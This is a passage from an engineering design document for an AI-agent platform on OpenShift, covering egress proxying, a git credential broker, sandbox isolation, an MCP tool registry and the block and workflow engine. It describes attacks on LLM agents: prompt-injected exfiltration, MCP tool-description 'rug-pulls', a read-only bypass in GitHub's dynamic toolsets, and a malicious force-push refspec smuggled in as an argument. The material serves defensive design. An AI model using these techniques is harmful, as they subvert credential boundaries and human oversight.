   mirror, the sandbox's remaining external set should be small and boring. This is now the *primary*
   reason mirrors come first, above the caching and supply-chain arguments.
2. **Published CIDRs where the provider offers them.** GitHub publishes authoritative ranges at
   `api.github.com/meta` — verified live: 60 `git`, 26 `api`, 29 `packages`, 40 `web`. Use
   `cidrSelector` refreshed from that endpoint, not `dnsName`. Authoritative and stable beats resolved
   and cached.
3. **`dnsName`** only for hosts that are stable, single-homed, and unmirrorable — and treat an
   intermittent egress failure as a suspected resolution-cache miss before anything else.
4. **An SNI-aware egress proxy** for anything CDN-backed, unmirrorable, and without published ranges.
   Filtering on the TLS ClientHello has no IP-caching failure mode at all.
   **Decided (Spike pl-rsch-10 / S1 follow-up): Deploy a lightweight standalone Envoy egress proxy (`envoyproxy/envoy:distroless`).**
   Because Spike S1 confirmed OpenShift's `DNSNameResolver` CRD is disabled and OVN `EgressFirewall` relies on legacy static IP caching, CDN-fronted hosts that rotate IPs on short TTLs (such as external LLM providers `api.anthropic.com` and `api.openai.com`, Google Vertex AI, and web search APIs in 4.9b/3.4) suffer intermittent dropped connections.
   - **SCC Compatibility:** Envoy runs unprivileged under OpenShift `restricted-v2` SCC (arbitrary assigned non-root UID, `requiredDropCapabilities: ALL`, read-only rootfs, unprivileged listener port e.g. 8443). At ~30–50MiB RAM footprint, it easily fits SNO constraints.
   - **Inspection without TLS Termination:** Envoy uses `tls_inspector` to extract SNI from the TLS ClientHello and enforces a domain allowlist via RBAC / `FilterChainMatch` before routing through `sni_dynamic_forward_proxy`. Because it proxies raw TCP streams without terminating TLS, no custom internal CA certificates or `ssl_bump` decryption are required, preventing domain fronting without breaking provider TLS pinning.
   - **Shared Service:** Deployed in Tier 2 (2.5) to serve both sandbox egress for unmirrorable dependencies and platform-side broker/LiteLLM egress (1.3, 3.4, 4.9b) via standard `HTTPS_PROXY` environment variables.

- **Nexus CE vs `git-pkgs/proxy` is the decision to make in planning.** The deciding test is cheap:
  does `git-pkgs/proxy` run unmodified under `restricted` SCC? If yes it wins on toil and quarantine;
  if no, Nexus CE with the known group-0 fix is the safe answer despite the 8GB floor. Either way we
  supply the auth layer.
- Whether kind CI runs the full mirror stack or a stub. Running four-ecosystem mirroring in CI may cost
  more than it validates; a stub that proves the client config is correct may be enough.

#### 2.6 — Git credential broker
**Goal:** The publish block pushes to GitHub without ever holding a long-lived token.
**Depends on:** 2.4, 2.5.
**Done when:** a broker service holds the GitHub App private key (never in a sandbox), mints 1-hour
installation tokens scoped to a single repo, and a git credential helper in the sandbox calls it
**per operation** rather than caching; tasks longer than the token TTL keep working; the broker refuses
tokens for pushes to protected branches; the broker is reachable only from sandboxes.
**Decided:** per-operation callout, not a pre-provisioned env var or a `.git-credentials` file — nothing
written to disk, nothing outliving a single operation. One surveyed project found a sandbox's
`.git-credentials` had accumulated four plaintext tokens, including admin-scoped ones, over time.
`kubernetes/git-sync` has native GitHub App auth and is a ready-made building block for **refreshing the
2.3 mirror**, which is now the only pull-side consumer. **Scope narrowed by 2.3 and 2.4:** the broker
serves push only, and its only client is the deterministic publish block (4.7) — never an LLM block.
**Decided: stay narrow — do not build a general secrets manager.** Back this broker with plain
Kubernetes Secrets (SOPS/age for anything GitOps-committed), and extend the broker pattern per
credential type as new ones appear. OpenBao is the credible general option if requirements ever grow —
MPL-2.0, Linux Foundation, and it has a third-party GitHub App secrets engine — but single-node is
explicitly discouraged by the project, real deployments want 3–5 node Raft, and the unseal-key custody,
plugin lifecycle, and Raft backup burden is disproportionate to a handful of credential types for one
operator. HashiCorp Vault is BUSL and now IBM-owned; licensing permits internal use but the operational
tax is the same. **External Secrets Operator does not fit at all** — its GitHub provider is *write-only*
(it pushes values into Actions secrets) and cannot mint installation tokens. Sealed Secrets has the
weakest audit trail of any option, which is the one property this entry most needs.
**Still required regardless:** every credential issuance is audited to the platform store and visible
in the dashboard. That is ours to build; none of the rejected options would have given it to us for free.
**Decided:** LLM blocks cannot run `git push` (per 2.4/4.7). Pushing is the exclusive job of a specific
deterministic block. The vulnerability is the LLM passing a malicious refspec string (e.g. `main:main -f`)
as an input argument. The deterministic block must enforce strict Pydantic regex validation on the
branch-name input variable, explicitly stripping flags and rejecting main-branch overwrites.

#### 2.7 — Elevated isolation tier for untrusted code
**Goal:** Reviewing an untrusted external PR does not run on the same boundary as trusted work.
**Depends on:** 2.1, 0.4.
**Done when:** a task can be marked untrusted; on OCP SNO that sets `runtimeClassName: kata` plus a
tightened egress and credential profile (no push creds); on kind it resolves to a validated no-op;
**when Kata is unavailable the system refuses to silently downgrade** and instead requires human diff
review before any tool executes against the untrusted content.
**Decided:** escalation trigger is provenance — code from outside the operator's own org — not a guess
about intent. Kernel escape is the one threat this uniquely addresses, and on SNO node compromise is
total cluster compromise.
**Reboot semantics, now verified — better than feared, with one sharp edge.** The node reboot is a
**per-lifecycle-event cost, not per-pod**: it fires on `KataConfig` creation, on deletion, and on
changing which nodes are Kata-scoped (`kataConfigPoolSelector` labels). Once installed, launching an
individual Kata pod is ordinary scheduling plus VM boot — no reboot, and warm pools absorb the latency.
Routine operator upgrades do not appear to reboot on their own when `KataConfig` is untouched, though
no doc explicitly rules it out. **The sharp edge: on SNO every one of those events is full-cluster
downtime, including the ones that feel like tweaks.** Changing Kata's node scoping later costs another
10–60+ minute outage. Get the scoping right at install.
**Alternatives evaluated and ranked for OpenShift:** Kata/OSC first (native, Red Hat supported);
Confidential Containers second (builds on OSC, adds SEV-SNP/TDX, needs capable hardware);
`urunc` third (lighter, but no OpenShift packaging — self-integration of a young project); KubeVirt
fourth (wrong shape — VMs as first-class objects, not container isolation); `systemd-vmspawn` not
viable. **Matchlock** was evaluated at the operator's suggestion: it is real
(`jingkaihe/matchlock`, MIT, Firecracker microVMs, host-side egress-allowlist and secret-injection
proxy) but has **zero Kubernetes integration** — no CRI, no RuntimeClass, no shim. It is a host CLI, and
it is explicitly experimental. Not viable here.

#### 2.8 — NVIDIA OpenShell as an in-sandbox hardening layer
**Goal:** Defense-in-depth *inside* the container, independent of the runtime tier.
**Depends on:** 2.2.
**Done when:** an evaluation determines whether wrapping block commands in OpenShell's
seccomp/Landlock/SELinux policy and egress-injecting credential model adds real value over the
Tier 0 baseline; if yes, it is integrated behind a per-block toggle.
**Decided: rejected for now, with a concrete revisit trigger.** OpenShell's shipped topology requires
`CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYSLOG` and `runAsUser: 0` — flatly
incompatible with OpenShift's `restricted-v2` SCC, and acknowledged as such in their own issue tracker
(NVIDIA/OpenShell#899, PR #3340). Adopting it today means granting a custom SCC with root and
`CAP_SYS_ADMIN`, which is the opposite of this tier's purpose.
Notably, **it is not Landlock or seccomp driving that requirement** — those need no elevated
capabilities. The caps exist for OpenShell's in-pod network-namespace interception, cross-UID binary
identity resolution via `/proc/<pid>/exe`, and a dmesg-based bypass monitor.
**What it would genuinely add, once it can run unprivileged:** L7 and credential-boundary control that
`NetworkPolicy` structurally cannot express — policy by *calling binary*, by HTTP method and path, and
injecting a real credential only after policy admits a specific endpoint. Red Hat's own comparison
frames OpenShell and Kata as complementary with disjoint coverage: OpenShell catches HTTP exfiltration
and prompt-injection leakage, Kata catches kernel escape, and neither covers the other.
**Revisit trigger:** RFC #981 (split supervisor/agent pods, unprivileged agent side, optional Kata
RuntimeClass) merging. Open and unmerged as of this writing, as is PR #2885 on removing `privileged`
from the install path. Delete the misleading `openshell.yaml` in 0.1 regardless.

---

## Tier 3 — Tools and integrations

#### 3.1 — Tool and MCP registry with project scoping
**Goal:** Tools are first-class, discoverable, authorized, and can be bound to a single project.
**Depends on:** 1.1, 2.2.
**Done when:** MCP servers and native tools are registered in the DB; each is scoped **global** or
**project-bound** (a repo-specific MCP server is only offered to blocks in that project); tool
invocation is authorized against the calling block's identity and project; the catalog is
introspectable; unauthorized invocation is denied and audited.
**Decided (Platform vs Sandbox MCP):** As defined in Invariant I4, the registry strictly differentiates deployment topologies. **Platform-level MCPs** (GitHub, Slack) are deployed as Kubernetes deployments alongside the Temporal workers, holding cluster secrets and network egress privileges. **Sandbox-level MCPs** (`agent-lsp`) are executed dynamically *inside* the Substrate workspace pod, possessing no credentials or network egress.

**Decided: "Bring Your Own Tools" (BYOT) via standard repo conventions.** The platform does *not* force
a proprietary config file onto user repos. If a repository ships its own workspace skills (e.g., a
`bootstrap.sh` script or standard `Makefile`), they belong inside the Sandbox (2.1). The platform's
Image Builder (0.2) uses these standard entrypoints to bake those CLI tools directly into the project's
sandbox base image, allowing the agent to use them natively via the `bash` tool without sidecars.
**Decided:** project-bound tools are a first-class scope, not a filter applied at prompt-build time —
scoping must be enforced at the invocation boundary, not just hidden from the model.

**The registry stores definitions and bindings separately** (per the scope model in Part 2). An
**integration definition** is the connector — an MCP server endpoint, its tool set, its schema — and
exists once. An **integration binding** says a given project uses it, with which credential (3.2) and
which configuration. Worked examples this has to handle, both falling out of the same model:
- `chai_bot`: one definition, bound to `osac` and whichever other projects need it. Projects without a
  binding cannot see or call its tools, and a call attempted anyway is refused at invocation.
- GitHub: one definition, bound to every project, but each binding carries that project's own repo
  scope and credential. Same connector, different reach per project.
**Auto-discovery on onboarding — and the principle that keeps it safe: discovery is automatic,
availability is not.** Registering an MCP integration calls `tools/list` and persists each tool's name,
description, and input schema into the registry. Nothing is typed by hand. But landing in the catalogue
grants nothing: a tool becomes reachable only once its integration is bound to a project and it is
included in a role subset (3.3). A tool that appears on a server tomorrow is catalogued and inert.

**Pin the definition; quarantine on change.** Store a hash of each tool's name, description, and schema
at the point it is approved for use. Re-discovery runs on a schedule (and on `listChanged` where a
server sends it — the earlier finding stands that many clients never implement it, so polling is the
reliable path). If a hash changes, the tool is **quarantined pending review**, not silently updated.
This is the mitigation for the rug-pull shape, where a server serves a benign definition at
registration and a mutated one later. A *description* change matters as much as a schema change: the
description is what steers the model.
**Discovered text is untrusted input.** Tool names and descriptions come from a third-party server
straight into agent context — 6.5's handling applies to them, not only to fetched web content.
**Removal is a reviewable event, not a silent drop.** A tool that disappears upstream is marked
removed, and anything referencing it — a block, a role subset — is flagged rather than left pointing at
nothing and failing at invocation.

**Done when** additionally: binding a project to an integration is a UI action that provisions the
credential and makes its tools resolvable to blocks in that project only; unbinding revokes cleanly;
the dashboard shows, per project, exactly which integrations are bound and which credentials back them.
**Decided: binding stops at the project; per-role narrowing is 3.3's job, and the two compose.**
Binding decides *what the project may use*; a role subset decides *what this agent sees*. So
`chai_bot` bound to `osac` and present only in the code-reviewer's subset is expressible with the two
mechanisms already specified. **Rejected: per-role bindings.** A second scoping dimension on the
binding itself would have to stay consistent with role subsets forever, and overlapping scope concepts
are exactly what produced the 3.3/4.3b confusion a quality gate had to untangle.

**Decided: consume first-party MCP servers; do not adopt an iPaaS.** Every integration actually named
now has an official server — Atlassian's Rovo MCP (GA, OAuth 2.1, audit-logged), Slack's own remote MCP
(GA since Feb 2026), GitHub's `github-mcp-server` (MIT, ~33k stars, hosted or a single Go binary), and
Google's Workspace MCP servers. These are hosted endpoints or static binaries — near-zero resource cost.
Hand-write a small MCP tool for anything long-tail; add a lightweight aggregator (MetaMCP, Docker MCP
Gateway, mcp-proxy) only if the server count grows past a handful.

**ByteChef rejected on verification**, reversing an earlier enthusiastic recommendation. The pitch was
250+ connectors over MCP; the evidence: the repo has **184 component directories, not 250+**, and no
source distinguishes which are MCP-reachable versus workflow-builder-only. Its MCP server is **two
weeks old** — three bugs filed and closed on 2026-09-06. **There is no resource sizing guidance
anywhere** — no `JAVA_OPTS`, no `-Xmx`, and the Helm chart ships `resources: {}` deliberately — so a
Java 25 / Spring Boot JVM would autosize its heap against the node, which on ~30GB of free memory on a
single node is an unbounded risk with no public data to size against. The chart is in-repo only,
`securityContext` is empty by default, the compose file bind-mounts to `/root/`, and **no evidence
exists of anyone running it on OpenShift** — `restricted-v2` remediation would be undocumented work we
own. Project health: single vendor, unfunded, pre-1.0 after four years, founder holds 10,872 of ~19,188
commits and the top six contributors account for ~89%. Licensing (Apache-2.0, connectors and MCP not
EE-gated) was the one claim that held up. **Revisit only if** the integration need becomes genuinely
broad — dozens of long-tail connectors — *and* its MCP server reaches documented stability with real
sizing guidance and a tested OpenShift path.

#### 3.2 — Integration credentials and secret brokering
**Goal:** Per-project and global integration credentials, encrypted, never handed to a block wholesale.
**Depends on:** 3.1, 2.6.

**The secret boundary is the deterministic-block boundary.** No LLM block ever receives a credential.
A credential is attached at the point of use by the deterministic block or tool adapter that needs it —
the LLM block passes intent and arguments, never a secret, and never sees one in its environment or
context. This is the single structural decision that makes the rest tractable: a prompt-injected block
cannot exfiltrate what was never in its reach.

**Storage, concretely.** One Kubernetes Secret per credential, labelled by scope (`global` /
`project:<id>`) and type, referenced by DB rows that carry the metadata, scope, and audit trail — the
Secret holds the bytes, Postgres holds everything else. Short-lived credentials are minted on demand
wherever the provider supports it (GitHub App installation tokens per 2.6; STS-style where available);
static credentials that cannot be minted (a Jira API token) are injected at invocation.

**Decided: the manager also handles Project-Generated Secrets.** If an agent generates a test DB
password or API token, it must not be committed to the user's repo or stored in plain-text artifacts.
Agents receive a tool (`platform_store_secret`) that writes directly to the project's K8s Secret backend.
The workspace provisioner (4.5) injects these back into future sandboxes via env vars or `tmpfs` `.env`
mounts.

**Verified gap that must be closed first: etcd encryption at rest is not enabled on the target
cluster.** The APIServer spec carries only `audit` and `servingCerts` — no `encryption` key. Every
Kubernetes Secret is therefore base64 in etcd, plaintext to anyone holding an etcd backup. Enabling it
(`spec.encryption.type`) triggers a rolling re-encryption, which on SNO means a disruption window.
**Until that is on, "encrypted at rest" is not true of this design** and the entry cannot claim it.
Audit profile is `Default`, which records metadata for Secret access but not comprehensively — hence
the platform's own audit rows below are the real trail, not the cluster's.

**Done when:** credentials are scoped global or per-project and brokered at point of use per 2.6; **no
LLM block can obtain one**; etcd encryption is enabled and verified; every issuance and use is an
audited row surfaced in the dashboard; credential rotation and revocation workflows are operational via UI (7.4) and CLI (7.5); updating a credential immediately evicts broker token caches via invalidation events and invalidates active in-flight worker tokens on their next invocation without pod restarts.
**Decided: Credential rotation and cache invalidation workflow.** Rotating or revoking an integration secret updates the K8s Secret atomically and publishes a revocation signal. Brokers (2.6, 3.4) evict in-memory token caches immediately; active worker tasks attempting to use the revoked credential fail fast with an actionable re-auth requirement rather than continuing on stale cached tokens.

#### 3.3 — Per-role capability scoping *(and the deliberate decision not to virtualize yet)*
**Goal:** No agent sees more capabilities than its role needs — achieved by curation, not machinery.
**Depends on:** 3.1.
**Done when:** the platform defines static capability subsets at the layer appropriate to each role —
distinguishing what an orchestrator may *schedule* (blocks and workflows) from what a block execution
may *call* (tools, narrowable per block, per 7.4); subsets are versioned and ready to be bound to Agent
definitions (4.3b); a supervisor never sees the full catalogue; a warning fires when any single role's
visible count approaches 30.

**Decided: do not build runtime tool virtualization now. Build static per-role subsets instead.**
This reverses the previous entry, which was going to build deferred schema loading. Three findings:

- **The threshold is not close.** Anthropic's own documentation states directly that tool-selection
  accuracy degrades past **30–50 tools loaded at once**, and that below ~10 tools "loading everything
  upfront is typically faster." OpenAI's guidance is <20 functions at turn start. Independent curves
  agree: flat to ~15, elbow at 20–35, degrading past 40. **The threshold that matters is
  *per-role visible count*, not total catalogue size** — Part 2's "dozens of blocks" describes the
  catalogue, while 3.3's per-role subsets are what an agent actually sees, and those stay far smaller.
  Re-measure the real per-role number once 4.9 seeds the library rather than trusting either figure.
  **At a small per-role count we are inside the band where
  virtualization is explicitly *not* beneficial.** Its measured accuracy gains come from removing noise
  that does not exist here yet.
- **Static subsetting is what the one real post-mortem endorses.** GitHub removed `--dynamic-toolsets`
  from its MCP server entirely (issue #275, PR #2512, −942/+51). What they *kept* was static
  `--toolsets` allow-lists plus a curated default cut from 101 tools to 52 (64.6k → 30.3k tokens). The
  durable fix was human curation, not runtime discovery.
- **It is the cheapest thing that works**, has no runtime failure mode, and will likely hold each role
  under threshold long after the total catalogue passes it.

**Why GitHub's removal matters beyond precedent — one failure is directly ours to avoid.** Their
dynamic toolsets **ignored `--read-only`**: a user obtained PR-approval capability through a server
configured read-only, because discovery shipped *outside* the permission model rather than inside it.
Whatever capability scoping we build must be evaluated by the 6.2 permission engine, not beside it.
Their other two failures were client statefulness (`tools/list_changed` unsupported by many clients)
and discovery reliability still broken a year on — "agents constantly cannot discover tools."

**Decided: `run_platform_tool(intent)` is rejected permanently, and typed blocks do not rescue it.**
The objection is orthogonal to catalogue quality: a second LLM stage is subject to the same generative
hallucination dynamics as the first unless constrained by schema-enforced decoding (arXiv:2609.19425).
Hallucinated calls concentrate overwhelmingly on raw-JSON surfaces — 34 versus 3 on schema-enforced
APIs, with a 675B model hallucinating at rates comparable to 7–8B models on raw JSON. So a typed
catalogue only helps if the *final* call is schema-enforced. And if the resolver is made to emit
schema-constrained calls, it has collapsed into deferred loading with an extra inference hop, extra
latency (500–2,000ms), and a context-loss telephone game where the resolver sees only an intent string
rather than the orchestrator's full context. Composio — 10,000+ tools, the closest real analogue to a
large typed platform-controlled catalogue — independently chose `SEARCH_TOOLS` → `EXECUTE_TOOL`. Nobody
near this problem picked the NL-collapse shape.

**When the threshold is crossed, prefer a typed code-execution SDK over a chat-turn meta-tool.**
Blocks composing into nested workflows is *already program structure*, so the natural expression is one
generated function per block inside the sandbox we already have, with `search_blocks()` /
`get_block_schema()` for discovery — workflow nesting becomes literal function composition rather than
a second abstraction stacked on tool-calling. This mirrors Anthropic's "Code Execution with MCP"
pattern (reported 150K → ~2K tokens; independent replications more modest at 58–92.8%, and it costs
~7% more latency from generating code as output). **Trigger: a single role genuinely needing 30–50+
visible blocks.** Not total catalogue size — per-role visible count.

#### 3.4 — Platform-mediated tool broker
**Goal:** A block can use a capability that needs credentials or network access, without the sandbox
gaining either.
**Depends on:** 3.1, 3.2, 2.2. *(Dynamic permission evaluation (6.2) and untrusted content wrapping (6.5) layer on as Tier 6 extensions).*
**Done when:** a platform-side broker executes tool calls on a block's behalf — establishing the generic RPC protocol and credential-proxy boundary for **MCP tool invocations** and bulk-read delegation (2.2), designed to host subsequent platform tools (`web_search`, `web_fetch`, `browser_automate` from 4.9b); the calling block passes arguments and receives results, never a credential and never a route to the internet; the broker holds credentials from 3.2 and carries its own narrow egress policy; invocations are authorized against project tool bindings (3.1/3.2) and audited.

**This entry exists because three separate things were quietly violating the same two invariants.**
An LLM block calling a hosted MCP endpoint (Atlassian Rovo, Slack, GitHub) needs network egress the
sandbox is denied by I2/2.5, and needs a token that I3 forbids it from holding. 2.2's bulk-read
delegation and 4.9b's fetch/browser blocks had each solved this ad hoc — 4.9b even stated the
principle correctly ("these run platform-side, not in the sandbox") without generalising it.
Meanwhile I4's own test — *can the orchestrator route around its failure?* — classified all three as
neither block nor tool, and nothing in the engine permitted invoking a block inside another block's
turn. One category resolves all of it.

**What distinguishes it from a block:** failure is **in-turn** — the model sees an error and reacts,
the orchestrator is not involved. That is the I4 test, applied honestly.
**What distinguishes it from a tool:** execution location. A tool runs in the sandbox with the
sandbox's (absent) privileges; a platform-mediated tool runs where the credentials and egress live.

**Decided: MCP servers are reached only through this broker.** Never from inside a sandbox. That
keeps the sandbox offline, keeps tokens out of block processes, and gives one place to audit
third-party tool use rather than one per integration.
**Decided (Modular Broker Architecture):** The tool broker operates as a lightweight centralized **Gateway and Router**, rather than a monolithic runtime housing all third-party binaries. It handles authentication, egress policy enforcement, rate limiting, and auditing centrally. Disparate third-party integrations (e.g., GitHub MCP, remote APIs) run in decoupled, lightweight container workloads with isolated credentials and narrow least-privilege egress rules. This avoids a monolithic God Object while preserving single-node resource efficiency and unified auditability.

## Tier 4 — The block and workflow engine

This is the product. End state: you define a multi-block workflow and it writes code, commits it, and
loops on failures.

#### 4.2 — Block I/O contract and artifact store
**Goal:** A single typed contract for how blocks receive input and emit output.
**Depends on:** 4.1.
**Done when:** blocks declare typed required and optional input variables; block exit contracts are strictly enforced via Pydantic schemas (capturing domain output like `files_changed`, but **never** provenance or self-reported decisions); artifacts (files, diffs, logs,
structured results) are stored, addressable, and passable between blocks; inputs are validated before
execution with clear errors; artifacts are retained and viewable per run.
**Decided:** design this before either block type. Both depend on it, and retrofitting a contract across
two implementations is worse than defining it once.
**Artifacts are classified at write: `result` or `evidence`.** They are stored as immutable blobs in
the **S3-compatible object store** (introduced in 4.1), while Postgres only retains a lightweight
metadata pointer (URI, class, size, timestamp). "Artifact" spans things with wildly
different value — a PR URL, a 40MB test log, a browser screenshot, and a research summary nobody
committed are not the same kind of object, and treating them as one category means either wasting
storage on reproducible logs or losing irreplaceable output.
- **`result`** — the artifact *is* the work product and nothing else holds it: generated content a
  block produced but never committed, an analysis, a plan. **Irreplaceable; backed up; not reaped on
  the normal schedule.**
- **`evidence`** — the record of how a run went: logs, exit codes, diffs of work that was subsequently
  published (git holds the real copy), screenshots, bulk-read summaries. **Reproducible or
  superseded; reaped on 4.10's schedule; excluded from backup.**
The block declares the class per output; the default is `evidence`, because assuming durability is how
storage fills. **Test:** if this run's output were lost and the run could not be repeated, is anything
of value gone? If yes it is a `result`.
**Artifacts are scanned and redacted at write, not at read.** Command output is the richest accidental
secret source in the platform — an env dump, a `curl -v` carrying an Authorization header, a failing
test printing a connection string. Artifacts are persisted (4.10), backed up (1.7), rendered in the
dashboard (7.1), and fed to downstream blocks as input, so a secret captured once propagates
everywhere it touches. 4.6b already redacts the captured git delta; that protection must cover **all**
artifact capture, not just the one place it was first noticed.

#### 4.3 — Deterministic code block
**Goal:** The simplest block type: run a command, capture everything, pass it on.
**Depends on:** 4.2, 2.4.
**Done when:** a code block runs a defined command in its bound workspace and captures exit code,
stdout, stderr, and file changes as artifacts; failure is a first-class outcome routable by the
orchestrator, not an exception; timeouts and resource limits are enforced.
**Decided:** build this before the LLM block — it is fully useful alone (a workflow of pure code blocks
is a CI pipeline) and it exercises the workspace and artifact layers without LLM nondeterminism.
**Decided: a deterministic block carries its command *and an optional inline script* as data.** The
script is stored with the definition and written into the workspace at execution. This makes editing a
block take effect on the next run with no container rebuild — which dissolves the archived
`git-sync` + `watchdog` hot-reload machinery rather than reimplementing it. The only case still
requiring an image rebuild is a block needing a **new binary dependency** in the sandbox, which is an
ordinary image change and not worth a reload mechanism.

#### 4.3b — Agent definitions
**Goal:** Persona and model choice are a reusable entity, not copy-pasted into every block.
**Depends on:** 1.3, 1.1.
**Done when:** an **Agent** is a first-class definition — name, system prompt/persona, logical model
reference, default tool scope, versioned — and LLM blocks *reference* an Agent rather than embedding a
persona; supervisors and orchestrators are Agents too; changing an Agent's model reference or persona
propagates to every block that references it; a block may override narrowly (extra instructions, a
different model for one step) with the override recorded as such.
**Decided: this entity is necessary, and the hierarchy is why.** Global supervisors, project
supervisors, and task orchestrators are all LLM-backed actors with a persona and a model — and **none
of them is a block**. Without an Agent entity they would need a parallel, undefined representation.
Making Agent the shared abstraction means one place defines "what this actor is," and a block becomes
*an Agent plus a task contract* (typed inputs, workspace mode, output schema).
**Decided:** the Agent carries the **logical** model reference (1.3), so model-family choices are made
per persona rather than per block — swapping the reviewer persona to a cheaper family is one edit, and
5.5's evaluation harness can measure that swap directly.
**Scoping follows I5, not a per-entity rule.** An Agent is a catalogue entity: defined once, `global`
or bound many-to-many to projects, resolved as global-plus-bound. *(An earlier draft left this Open and
proposed an `override` model — that is not I5's answer, and the two produce different schemas: a
nullable `project_id` versus a binding table.)*

#### 4.4 — LLM block
**Goal:** The non-deterministic block type: a persona with a model and typed inputs.
**Depends on:** 4.2, 1.3, 3.1, 4.3b, 1.5.
**Done when:** a block is defined by a system prompt/persona, a **logical** model reference (fallbacks
handled by 1.3), required inputs (task prompt, artifacts) and optional inputs (e.g. a commit message);
it can call tools scoped by 3.1; output is structured and validated; token usage attributes to the run
via 1.5.
**Decided:** blocks reference logical models only. A block definition never names a provider.
**A block is a bounded loop, not a single turn — and the bound is part of the contract.** A code-writer
calls tools repeatedly before producing output, so an LLM block declares **maximum turns** and a
**maximum token spend**, both enforced here by the engine. Hitting either is a routable failure, not a
truncated success. These bounds are self-contained: this entry does **not** depend on 6.4 — rather 6.4
later aggregates what this entry already enforces, so a block is bounded even if admission control does
not exist yet. Without per-block bounds, 6.4 would cap runs, retries, and spawn depth while a single
block looped forever inside one of them.


#### 4.4b — Declarative In-Repo Skills (`SKILL.md`)
**Goal:** Projects can define their own LLM blocks and workflows natively via Markdown files in the repo.
**Depends on:** 4.3, 4.4.
**Done when:** the platform watches `.platform/skills/*.md` in the user's repository; parses files containing YAML frontmatter (defining the model, tool bindings, and inputs) and Markdown prose (the system prompt/instructions); and stages them into the pending capability queue (4.13) so that human approval is required before they are synced into the Postgres database as active Project-Bound Blocks or Workflows.
**Decided:** this bridges the gap between DB-canonical definitions (1.1) and the developer experience of writing agents in code while strictly enforcing Invariant I6. An agent can propose a new `SKILL.md` file by committing it, but the platform stages it as a pending capability proposal rather than instantly absorbing it as an executable block, preventing unreviewed capability escalation and prompt-injection vectors.

**Open (Multi-Node Scaling):** Spike S3 optimized workspace hydration for a single node via shared RWO
PVCs and OS-level hardlinks. If the cluster graduates to multi-node, this storage topology forces pod
affinity hotspots. Research is required to determine the best multi-node hydration architecture (e.g.,
Node-Local DaemonSet Caches, P2P distribution, or specialized CSI drivers) before expanding the cluster.
#### 4.4c — Decision block (System 1)
**Goal:** Fast, structured classification and routing decisions without the latency or parsing fragility of generative LLMs.
**Depends on:** 4.2.
**Done when:** a block type exists specifically for System 1 models (e.g., Jev, Laya) that accepts state and outputs calibrated probabilities (`Choice`, `Score`, `Noul`) in a single forward pass; it executes in tens-to-hundreds of milliseconds; its output directly drives LangGraph conditional edges.
**Decided (Research: `hack/research/feat-research-1727042000-jev-laya-decision-models.md`):** Differentiate System 1 (Classification/Routing) from System 2 (Generative LLM) blocks. Generative LLMs are too slow (500-2000ms) and fragile (JSON parsing) for high-frequency control loops.

#### 4.5 — Block workspace binding
**Goal:** `shared` vs `isolated` is a declared property of a block, enforced by the runtime.
**Depends on:** 4.3, 2.4.
**Done when:** a block declares its workspace mode; the engine provisions the primary tree or a local
clone accordingly; a code-writer block followed by a commit block sees the same tree; a QA block gets its
own; concurrent isolated blocks do not interfere; a crashed isolated block cannot corrupt the primary
tree; and **blocks sharing the primary tree acquire runtime-enforced file claims** before writing.
**How claiming actually works — declare-then-schedule, not intercept-at-write.** You cannot intercept
an arbitrary `sed` inside a shell, so the enforcement point is scheduling, not the filesystem. A block
declares the paths it will touch as part of its definition; the engine refuses to run two concurrent
shared-tree blocks whose declarations overlap, queueing the second instead. Coarse, but enforceable
and deterministic — and it is the property AgentRoom measured, not a finer-grained one.
**Workspace storage: PVC by default. *(Reverses an earlier `emptyDir`-by-default call.)*** `emptyDir`
survives container restarts but **not** pod deletion, eviction, or node reboot — so an evicted task pod
silently loses uncommitted work. Three reasons the default flips:
- **The original reasoning doesn't apply on this cluster.** `emptyDir` was chosen to avoid network
  storage, but the measured storage class is `topolvm` — node-local LVM. A PVC here *is* local disk.
  The performance argument evaporates.
- **Nobody should have to predict this.** Asking a task author (human or agent) to decide up front
  whether their work is "long-running enough" to warrant a PVC is a judgment call that will sometimes
  be wrong, and the cost of getting it wrong is **silent data loss**. The cost of the opposite error is
  a volume that needs reaping — visible, cheap, and already handled by 4.10's reaper.
- **It is what Agent Substrate natively provides.** Substrate's durable volumes (e.g., `DurableDir` or `ExternalVolumeTemplate`) are preserved across restart *and* across suspend/resume. Choosing `emptyDir` or local ephemeral storage means declining the
  mechanism the Substrate controller exists to provide, and forfeiting suspend/resume.

So: the platform always provisions a workspace volume; the tunable knob is **retention policy** (reap
immediately after task completion versus retain for N hours to allow inspection), which is a safe thing to tune because Substrate guarantees volume cleanup via `DeleteActor`.
**Decided:** the claim mechanism is enforced by the engine, not requested of the model in a prompt.
AgentRoom measured a 13.7x reduction in task-abandonment odds from exactly this, and found it — not a
CRDT substrate — was what made concurrent coding agents work.

#### 4.5b — Project Shadow Repo (Meta-Repo)
**Goal:** Living documents (plans, research, evolving state) have version history without polluting the
user's public repository.
**Depends on:** 4.5, 1.7.
**Done when:** every project is backed by a platform-managed bare Git repository stored on the state
PVC; this repo is cloned into sandboxes alongside the user's code; at the end of every mutating block,
the platform automatically commits and pushes any changes in this meta-repo; it is backed up to R2 (1.7).
**Decided: transparent out-of-band shadow repo tracking without in-container bind mounts.** To support existing repo instructions (e.g., "write plans to `.artifacts/`"), the platform intercepts git-ignored paths without requiring in-container filesystem bind mounts. Dynamic in-container bind mounts are impossible under OpenShift's `restricted-v2` SCC and Kata microVMs (2.7) because unprivileged containers lack `CAP_SYS_ADMIN` and virtio-fs restricts in-guest cross-mount propagation; Kubernetes also does not support nested volume mounts within an active volume. Instead, the agent writes directly to ordinary directories in `/workspace` (`/workspace/.artifacts`, `/workspace/.platform`). The user repository excludes these paths via `.git/info/exclude` so user git status remains clean without modifying repo files. The platform maintains the bare shadow git repository out-of-band on the state PVC (e.g., `/mnt/shadow_repo.git`). At the end of every mutating block, the platform executes an out-of-band commit against declared paths (`shadow_mounts`, configured in 1.1/8.2) using `git --git-dir=/mnt/shadow_repo.git --work-tree=/workspace add <path>` and commits changes to the shadow repo. The agent follows repo instructions blindly, writes route cleanly on the workspace volume, and the platform securely isolates and commits them without elevated privileges or symlinks.

#### 4.6 — Workflow composition and the task orchestrator
**Goal:** Blocks compose into workflows, and an orchestrator agent routes between them — including
feeding failures backwards.
**Depends on:** 4.3, 4.4, 4.5, 1.9.
**Done when:** workflows are defined as block graphs with conditional routing; the orchestrator
**selects and parameterises a workflow** from the library and dispatches its blocks; **a failing
Project Validation Pipeline execution is routed back to the block that caused it with the failure output as input**; retry
and give-up limits are bounded and configurable; giving up escalates to the pending queue rather than
failing silently.
